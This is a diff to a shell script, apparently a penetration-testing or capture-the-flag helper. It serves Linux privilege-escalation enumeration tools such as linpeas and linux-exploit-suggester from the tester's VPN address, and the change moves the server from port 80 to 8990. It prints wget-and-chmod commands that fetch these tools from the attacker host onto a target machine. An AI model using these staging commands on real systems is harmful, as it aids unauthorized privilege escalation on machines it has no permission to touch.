@@ -29,12 +29,12 @@ ip=$(ip addr | grep tun0 | grep inet | grep 10. | tr -s " " | cut -d " " -f 3 | 
 echo ""
 echo "You can download any of these tools on your target using commands below:"
 echo ""
-echo "wget http://$ip/linpeas.sh; chmod +x linpeas.sh"
-echo "wget http://$ip/suid3num.py; chmod +x suid3num.py"
-echo "wget http://$ip/linenum.sh; chmod +x linenum.sh"
-echo "wget http://$ip/lse.sh; chmod +x lse.sh"
-echo "wget http://$ip/linux-exploit-suggester.sh; chmod +x linux-exploit-suggester.sh"
-echo "wget http://$ip/linuxprivchecker.py; chmod +x linuxprivchecker.py"
+echo "wget http://$ip:8990/linpeas.sh; chmod +x linpeas.sh"
+echo "wget http://$ip:8990/suid3num.py; chmod +x suid3num.py"
+echo "wget http://$ip:8990/linenum.sh; chmod +x linenum.sh"
+echo "wget http://$ip:8990/lse.sh; chmod +x lse.sh"
+echo "wget http://$ip:8990/linux-exploit-suggester.sh; chmod +x linux-exploit-suggester.sh"
+echo "wget http://$ip:8990/linuxprivchecker.py; chmod +x linuxprivchecker.py"
 echo ""
 
-sudo python3 -m http.server 80
+sudo python3 -m http.server 8990
